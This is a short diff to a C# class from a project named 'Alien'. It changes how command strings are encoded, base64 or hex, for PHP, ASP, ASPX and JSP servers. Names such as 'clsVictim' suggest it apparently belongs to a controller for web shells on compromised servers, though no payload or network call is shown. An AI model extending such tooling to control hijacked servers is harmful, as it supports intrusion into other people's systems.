@@ -85,10 +85,12 @@ namespace Alien
         private Dictionary<enLanguage, Func<string, string>> m_dicEncapusulator = new Dictionary<enLanguage, Func<string, string>>()
         {
             { enLanguage.PHP, clsEzData.fnszStre2b64 },
-            { enLanguage.ASP, szInput => Convert.ToHexString(Encoding.UTF8.GetBytes(szInput)) },
+            { enLanguage.ASP, clsEzData.fnszStre2b64 },
             { enLanguage.ASPX, clsEzData.fnszStre2b64 },
             { enLanguage.JSP, szInput => szInput } // nop
         };
+
+
 
         public clsWeb(clsVictim victim)
         {
